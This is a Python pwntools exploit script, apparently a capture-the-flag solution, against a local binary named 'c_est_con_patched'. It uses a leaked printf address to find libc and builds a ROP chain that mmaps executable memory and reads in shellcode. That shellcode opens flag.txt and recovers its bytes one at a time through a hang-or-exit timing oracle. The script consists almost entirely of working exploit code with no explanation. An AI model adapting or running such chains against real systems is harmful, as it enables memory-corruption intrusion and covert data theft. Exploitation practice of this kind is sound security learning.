#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('c_est_con_patched')
libc = ELF('libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *handling+36
b *read
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b'Debugz.. : ')

leak = int(io.recv(14),16)
libc.address = leak - libc.sym['printf']
log.success(f'{libc.address = :x}')

OFFSET = cyclic_find(0x6161616161616170,n=8)
POP_R8 = 0x0000000000165b76 + libc.address # pop r8 ; mov eax, 1 ; ret
MOV_R9 = 0x0000000000077a33 + libc.address # mov r9, rax ; pop r12 ; pop r13 ; mov rax, r9 ; pop r14 ; ret
CALL_RAX = 0x0000000000041563 + libc.address # push rax ; ret

## Available syscalls
#  read
#  open
#  mmap
#  exit

addr = 0x4000000
length = 0x2000 
prot = 7 
flags = 0x22 
fd = 0xffffffff
offset = 0 

p = b'A'*OFFSET
rop = ROP(libc)

# mmap()
rop.raw(p64(POP_R8)+p64(0))
rop.rax = 0
rop.raw(p64(MOV_R9)+p64(0)*3)
rop.mmap(addr, length, prot, flags)

# read(0, addr, 0X2000)
rop.read(0, addr, length)

# jump on shellcode
rop.rax = addr
rop.raw(p64(CALL_RAX))


print(rop.dump())
p += rop.chain()
p += p64(exe.sym['main'])

io.sendline(p)


sh = shellcraft.open('flag.txt')
sh += shellcraft.read('rax',addr+0X1000,32)
index=0
hex_char=hex(ord('H'))
sh += f"""
xor rbx,rbx
mov rax, 0x4001000
add rax, {str(index)}
mov bl, byte ptr[rax]
cmp rbx, {hex_char}
je INFI_LOOP

mov rax, 60
mov rdi, 0
syscall

INFI_LOOP:
    je INFI_LOOP
    hlt
"""

print(sh)

io.sendline(asm(sh))

sleep(0.5)
try :
    for i in range(100):
        io.sendline(b"")
    sleep(4)
    io.sendline(b"")

    print(f"[+] Found : {chr(int(hex_char,16))}")
    found = chr(int(hex_char,16))
    io.close()
except:
    #print("NO")
    found = None
    io.close()
    #pass

#io.interactive()

